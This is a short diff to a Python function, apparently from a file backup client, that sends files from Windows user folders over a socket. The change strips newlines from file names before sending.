@@ -300,12 +300,23 @@ def GETFILES(soc):
     for index, file in enumerate(f):
         if file.__contains__("C:\\Users"):
             time.sleep(1)
-            print('SENDING BACKUP FILE: ' + str(file))
+
             message = "--SENDING_BACKUP_FILES--" + str(socket.gethostname())
             message = message.encode("utf-8")
             soc.send(message)
             print('sent message')
-            File_Sender.send_backup_files(file, f[index + 1])
+            try:
+                file = file.split("\n")[0]
+            except:
+                pass
+            otherfile = f[index + 1]
+            try:
+                otherfile = otherfile.split("\n")[0]
+            except:
+                pass
+            print('SENDING BACKUP FILE: ' + str(file))
+            print('SENDING NAME + ' + otherfile)
+            File_Sender.send_backup_files(file, otherfile)
 
 
 
